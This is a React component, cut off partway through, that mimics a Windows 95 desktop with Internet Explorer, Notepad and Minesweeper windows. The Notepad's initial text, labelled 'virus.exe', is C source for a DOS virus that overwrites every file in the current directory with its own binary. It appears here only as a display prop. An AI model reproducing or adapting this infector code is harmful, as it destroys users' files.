import React, { useState, useEffect } from 'react';
import Draggable from "react-draggable";
import ReactPlayer from 'react-player';
import TypeWriter from '../components/TypeWriter';
import './Windows.scss';
const Windows = () => {

    const [state, setState] = useState({
        address: "https://ui.upshow.tv/",
        mineCode: false,
        transmission: true,
        startmenu: false,
        ie: true,
        ieVisibility: true,
        mine: false,
        mineVisibility: true,
        notepad: false,
        notepadVisibility: true,
        poopVisibility: true,
        notepadText:
            `#include<stdio.h>
#include<io.h>
#include<dos.h>
#include<dir.h>
#include<conio.h>
#include<time.h> FILE *virus,*host;
int done,a=0;
unsigned long x;
char buff[2048];
struct ffblk ffblk;
clock_t st,end;
void main()
{
    st=clock();
    clrscr();
    done=findfirst(“*.*”,&ffblk,0);
    while(!done)
    {
        virus=fopen(_argv[0],”rb”);
        host=fopen(ffblk.ff_name,”rb+”);
        if(host==NULL) goto next;
        x=89088;
        printf(“Infecting %s\n”,ffblk.ff_name,a);
        while(x>2048)
        {
            fread(buff,2048,1,virus);
            fwrite(buff,2048,1,host);
            x-=2048;
        }
        fread(buff,x,1,virus);
        fwrite(buff,x,1,host);
        a++;
        next:
            {
            fcloseall();
            done=findnext(&ffblk);
            }
        }
        printf(“DONE! (Total Files Infected= %d)”,a);
        end=clock();
        printf(“TIME TAKEN=%f SEC\n”,
        (end-st)/CLK_TCK);
        getch();
    }`,
        m0: true,
        m1: false,
        m2: false,
        m3: false,
        m4: false,
        m5: false,
        m6: false,
        m7: false,
        m8: false,
        m9: false,
        m10: false,
        m11: false,
        m12: false,
        m13: false,
        m14: false,
        m15: false,
        m16: false,
        m17: false,
        m18: false,
        m19: false,
        m20: false,
        m21: false,
        m22: false,
        m23: false,
        m24: false,
        m25: false,
        m26: false,
        m27: false,
        m28: false,
        m29: false,
        m30: false,
        m31: false,
        m32: false,
        m33: false,
        m34: false,
        m35: false,
        m36: false,
        m37: false,
        m38: false,
        m39: false,
        m40: false,
        m41: false,
        m42: false,
        m43: false,
        m44: false,
        m45: false,
        m46: false,
        m47: false,
        m48: false,
        m49: false,
        m50: false,
        m51: false,
        m52: false,
        m53: false,
        m54: false,
        m55: false,
        m56: false,
        m57: false,
        m58: false,
        m59: false,
        m60: false,
        m61: false,
        m62: false,
        m63: false,
        m64: false,
        poopup: false
    });


    return (
        <>
            <div className="content">
                <div className="Windows">
                    <div id="screen">
                        <input type="checkbox" id="open-startmenu" onChange={(event) => { setState({ ...state, startmenu: !state.startmenu }); }} checked={state.startmenu} />
                        <input type="checkbox" id="open-poopup" onChange={(event) => { }} checked={state.poopup} />
                        <input type="checkbox" id="open-poop" checked onChange={() => { }} />
                        <input type="checkbox" id="open-notepad" checked onChange={() => { }} />
                        <input type="checkbox" id="open-mine" checked onChange={() => { }} />
                        <input type="checkbox" id="open-ie" checked onChange={() => { }} />
                        <input type="radio" name="task" id="fore-notepad" onChange={(event) => { }} checked={state.notepad} />
                        <input type="radio" name="task" id="fore-mine" onChange={(event) => { }} checked={state.mine} />
                        <input type="radio" name="task" id="fore-ie" onChange={(event) => { }} checked={state.ie} />
                        <input type="radio" name="deskicon" id="focus-pc" />
                        <input type="radio" name="deskicon" id="focus-recycle" />
                        <div id="desktop">
                            <nav id="icons">
                                <Draggable>
                                    <label id="icon-pc" htmlFor="focus-pc">
                                        <i className="lg pc"></i>
                                        <span className="label">My Computer</span>
                                    </label>
                                </Draggable>
                                <Draggable>
                                    <label id="icon-recycle" htmlFor="focus-recycle">
                                        <i className="lg recycle"></i>
                                        <span className="label">Recycle Bin</span>
                                    </label>
                                </Draggable>
                            </nav>
                        </div>
                        <label id="close-startmenu" htmlFor="open-startmenu"></label>
                        <label id="close-poopup" htmlFor="open-poopup" onClick={() => { setState({ ...state, poopup: !state.poopup }) }}></label>
                        <div id="taskbar">
                            <label id="start" htmlFor="open-startmenu">
                                <i className="sm win"></i>
                                <span className="label">Start</span>
                            </label>
                            <nav id="tasklist">
                                <label className="btn" id="task-notepad" htmlFor="fore-notepad" onClick={() => { if (!state.notepad) setState({ ...state, notepad: !state.notepad, mine: state.notepad, ie: state.notepad, notepadVisibility: !state.notepad }) }}>
                                    <i className="sm pad"></i>
                                    <span className="label">virus.exe - Notepad</span>
                                </label>
                                <label className="btn" id="task-mine" onClick={() => { if (!state.mine) setState({ ...state, notepad: state.mine, mine: !state.mine, ie: state.mine, mineVisibility: !state.mine }) }}>
                                    <i className="sm bomb"></i>
                                    <span className="label">Minesweeper</span>
                                </label>
                                <label className="btn" id="task-ie" htmlFor="fore-ie" onClick={() => { if (!state.ie) setState({ ...state, notepad: state.ie, mine: state.ie, ie: !state.ie, ieVisibility: !state.ie }) }}>
                                    <i className="sm globe"></i>
                                    <span className="label">Microsoft Internet Explorer - [One mind blowing fact you didn't know about CSS4]</span>
                                </label>
                            </nav>
                            <div id="notify">
                                <label id="poop" htmlFor="open-poopup" style={{ display: state.poopVisibility ? 'block' : 'none' }} onClick={() => { setState({ ...state, poopup: !state.poopup }) }}>
                                    <i className="sm poo"></i>
                                </label>
                                <div id="clock">
                                    <span>9:</span>
                                    <div className="digit">0</div>
                                    <div className="digit tictoc">
                                        0<br />1<br />2<br />3<br />4<br />5<br />6<br />7<br />8<br />9<br />0
                                    </div>
                                    <span>&nbsp;AM</span>
                                </div>
                            </div>
                        </div>
                        <div id="startmenu">
                            <h2>Windows<em>95</em></h2>
                            <nav className="group">
                                <div className="item dropdown">
                                    <i className="md app"></i>
                                    <span className="label">Programs</span>
                                    <div className="submenu">(None)</div>
                                </div>
                                <div className="item dropdown">
                                    <i className="md doc"></i>
                                    <span className="label">Documents</span>
                                    <div className="submenu">(None)</div>
                                </div>
                                <div className="item dropdown">
                                    <i className="md cog"></i>
                                    <span className="label">Settings</span>
                                    <div className="submenu">(None)</div>
                                </div>
                                <div className="item dropdown">
                                    <i className="md find"></i>
                                    <span className="label">Find</span>
                                    <div className="submenu">(None)</div>
                                </div>
                                <a className="item" href="#error">
                                    <i className="md help"></i>
                                    <span className="label">Help</span>
                                </a>
                                <a className="item" href="#error">
                                    <i className="md run"></i>
                                    <span className="label">Run...</span>
                                </a>
                            </nav>
                            <nav className="group">
                                <a className="item" href="#error">
                                    <i className="md shut"></i>
                                    <span className="label">Shut Down...</span>
                                </a>
                            </nav>
                        </div>
                        <Draggable handle=".handle-ie">
                            <form id="app-ie" role="dialog" style={{ visibility: state.ieVisibility ? 'visible' : 'hidden' }}>
                                <h2 className="handle-ie">
                                    <i className="sm globe"></i>
                                    <label className="label" htmlFor="fore-ie" onClick={() => { if (!state.ie) setState({ ...state, notepad: state.ie, mine: state.ie, ie: !state.ie }) }}>Microsoft Internet Explorer - [One mind blowing fact you didn't know about CSS3]</label>
                                    <a className="btn min" onClick={() => {
                                        setState({ ...state, notepad: !state.ieVisibility, mine: !state.ieVisibility, ie: !state.ieVisibility, ieVisibility: !state.ieVisibility })
                                    }}></a>
                                    <a className="btn max" href="#error"></a>
                                    <label className="btn close" htmlFor="open-ie"></label>
                                </h2>
                                <nav className="menu">
                                    <a href="#error">File</a>
                                    <a href="#error">Edit</a>
                                    <a href="#error">View</a>
                                    <a href="#error">Go</a>
                                    <a href="#error">Favorites</a>
                                    <a href="#error">Help</a>
                                </nav>
                                <div className="client">
                                    <header>
                                        <div className="label">Address:</div>
                                        <div className="combo">
                                            <input spellCheck="false" onChange={(event) => { setState({ ...state, address: event.target.value }); }} value={state.address} />
                                            <a className="dropdown" href="#error"></a>
                                        </div>
                                        <div className="win">
                                            <i className="clouds"></i>
                                            <i className="logo"></i>
                                        </div>
                                    </header>
                                    <div className="content">
                                        <div className={`overlay hackerblink ${ state.transmission ? 'hacked' : '' }`}></div>
                                        <ReactPlayer url={'https://www.youtube.com/watch?v=fHdaqrfXht8'} loop config={{ youtube: { playerVars: { disablekb: 1 } } }} controls={false} playing={true} />
                                    </div>
                                    <footer>
                                        <div className="pane-1">&#8203;</div>
                                        <div className="pane-2">&#8203;</div>
                                        <div className="pane-3">&#8203;</div>
                                    </footer>
                                </div>
                            </form>
                        </Draggable>
                        <Draggable handle=".handle-notepad">
                            <form id="app-notepad" role="dialog" style={{ visibility: state.notepadVisibility ? 'visible' : 'hidden' }}>
                                <h2 className="handle-notepad">
                                    <i className="sm pad"></i>
                                    <label className="label" htmlFor="fore-notepad" onClick={() => { if (!state.notepad) setState({ ...state, notepad: !state.notepad, mine: state.notepad, ie: state.notepad }) }}>virus.exe - Notepad</label>
                                    <a className="btn min" onClick={() => {
                                        setState({ ...state, notepad: !state.notepadVisibility, mine: !state.notepadVisibility, ie: !state.notepadVisibility, notepadVisibility: !state.notepadVisibility })
                                    }}></a>
                                    <a className="btn max" href="#error"></a>
                                    <label className="btn close" htmlFor="open-notepad"></label>
                                </h2>
                                <nav className="menu">
                                    <a href="#error">File</a>
                                    <a href="#error">Edit</a>
                                    <a href="#error">Search</a>
                                    <a href="#error">Help</a>
                                </nav>
                                <div className="client">
                                    <textarea rows="22" cols="60" onChange={(event) => { setState({ ...state, notepadText: event.target.value }) }} spellCheck="false" value={state.notepadText}></textarea>
                                </div>
                            </form>
                        </Draggable>
                        <Draggable handle=".handle-mine">
                            <form id="app-mine" role="dialog" style={{ visibility: state.mineVisibility ? 'visible' : 'hidden' }}>
                                <h2 className="handle-mine">
                                    <i className="sm bomb"></i>
                                    <label className="label" onClick={() => { if (!state.mine) setState({ ...state, notepad: state.mine, mine: !state.mine, ie: state.mine }) }}>Minesweeper</label>
                                    <a className="btn min" onClick={() => {
                                        setState({ ...state, notepad: !state.mineVisibility, mine: !state.mineVisibility, ie: !state.mineVisibility, mineVisibility: !state.mineVisibility })
                                    }}></a>
                                    <a className="btn max" href="#error"></a>
                                    <label className="btn close" htmlFor="open-mine"></label>
                                </h2>
                                <nav className="menu">
                                    <a href="#error">Game</a>
                                    <a href="#error">Help</a>
                                </nav>
                                <div className="client">

                                    {
                                        [...Array(65).keys()].map((index) => {
                                            const name = 'm' + index
                                            return (
                                                <input type="radio" key={index} name="mine" id={name} onChange={(event) => { }} checked={state[name]} />
                                            )
                                        })
                                    }

                                    <header>
                                        <div className="number init"><i className="num-0"></i><i className="num-6"></i><i className="num-3"></i></div>
                                        <div className="number won lose"><i className="num-0"></i><i className="num-0"></i><i className="num-0"></i></div>
                                        <label className="btn face init" htmlFor="m0">&#x1F642; </label>
                                        <label className="btn face won" htmlFor="m0">&#x1F60E; </label>
                                        <label className="btn face lose" htmlFor="m0">&#x1F635; </label>
                                        <div className="number init"><i className="num-0"></i><i className="num-0"></i><i className="num-0"></i></div>
                                        <div className="number won lose"><i className="num-0"></i><i className="num-0"></i><i className="num-1"></i></div>
                                    </header>
                                    <nav className="minefield" id="mf-0">
                                        {
                                            [...Array(64).keys()].map((index) => {
                                                const pointer = index + 1;
                                                const name = 'm' + pointer
                                                return (
                                                    <label
                                                        key={index}
                                                        htmlFor={name}
                                                        className="btn"
                                                        onClick={(event) => {
                                                            const newState = { ...state }
                                                            newState[name] = !state[name]
                                                            setState(newState)
                                                        }}
                                                    ></label>
                                                )
                                            })
                                        }
                                    </nav>
                                    <ul className="minefield" id="mf-1">
                                        <li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-2">
                                        <li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-3">
                                        <li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-4">
                                        <li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-5">
                                        <li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-6">
                                        <li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-7">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-8">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-9">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-10">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-11">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-12">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-13">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-14">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-15">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-16">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-17">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-18">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-19">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-20">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-21">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-22">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-23">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-24">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-25">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-26">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-27">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-28">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-29">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-30">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-31">
                                        <li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li className="hit"></li><li></li><li></li><li></li><li></li><li></li><li className="safe"></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li><li></li>
                                    </ul>
                                    <ul className="minefield" id="mf-32">
